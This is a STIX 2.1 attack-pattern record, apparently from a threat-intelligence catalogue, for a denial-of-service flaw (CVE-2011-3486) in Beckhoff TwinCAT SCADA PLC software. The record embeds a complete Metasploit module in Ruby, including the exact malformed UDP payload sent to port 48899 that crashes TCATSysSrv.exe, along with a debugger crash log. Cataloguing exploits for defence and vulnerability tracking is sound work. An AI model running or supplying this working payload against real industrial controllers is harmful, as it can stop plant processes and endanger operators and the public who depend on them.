{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8f46cd96-7f36-48e6-b296-d3217f606d98",
    "created": "2024-08-14T16:24:46.648807Z",
    "modified": "2024-08-14T16:24:46.648812Z",
    "name": "Beckhoff TwinCAT SCADA PLC 2.11.0.2004 DoS",
    "description": " The Beckhoff TwinCAT version <= 2.11.0.2004 can be brought down by sending a crafted UDP packet to port 48899 (TCATSysSrv.exe). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/scada/beckhoff_twincat.rb",
            "external_id": "beckhoff_twincat.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-3486"
        },
        {
            "source_name": "reference",
            "url": "http://aluigi.altervista.org/adv/twincat_1-adv.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Udp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Beckhoff TwinCAT SCADA PLC 2.11.0.2004 DoS',\n      'Description'    => %q{\n        The Beckhoff TwinCAT version <= 2.11.0.2004 can be brought down by sending\n        a crafted UDP packet to port 48899 (TCATSysSrv.exe).\n      },\n      'Author'         =>\n        [\n          'Luigi Auriemma', # Public exploit\n          'jfa',            # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2011-3486' ],\n          [ 'OSVDB', '75495' ],\n          [ 'URL', 'http://aluigi.altervista.org/adv/twincat_1-adv.txt' ]\n        ],\n      'DisclosureDate' => '2011-09-13'\n    ))\n\n    register_options([Opt::RPORT(48899)])\n  end\n\n  def run\n    dos = \"\\x03\\x66\\x14\\x71\" + \"\\x00\"*16 + \"\\xff\"*1514\n    connect_udp\n    print_status(\"Sending DoS packet ...\")\n    udp_sock.put(dos)\n    disconnect_udp\n  end\nend\n\n=begin\n0:017> g\n(4d4.850): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=02a1f9cf ebx=0037c0a8 ecx=02a0f9cc edx=ffffffff esi=02a0f9b4 edi=00000001\neip=00414f6a esp=02a0f7bc ebp=0000ffff iopl=0         nv up ei pl nz ac po cy\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010213\n*** ERROR: Module load completed but symbols could not be loaded for C:\\TwinCAT\\TCATSysSrv.exe\nTCATSysSrv+0x14f6a:\n00414f6a 66833802        cmp     word ptr [eax],2         ds:0023:02a1f9cf=????\n0:016> k\nChildEBP RetAddr\nWARNING: Stack unwind information not available. Following frames may be wrong.\n02a0f7f8 71ab265b TCATSysSrv+0x14f6a\n02a0f80c 71ab4a9e WS2_32!Prolog_v1+0x21\n02a0f834 7c90df3c WS2_32!WPUQueryBlockingCallback+0x1b\n02a0f880 71a5332f ntdll!NtWaitForSingleObject+0xc\n02a0f8f4 71abf6e7 mswsock!WSPRecvFrom+0x35c\n02a0f938 71ad303a WS2_32!WSARecvFrom+0x7d\n02a0f96c 00414b92 WSOCK32!recvfrom+0x39\n02a0f988 00000000 TCATSysSrv+0x14b92\n=end\n",
    "x_mitre_disclosure_date": "2011-09-13"
}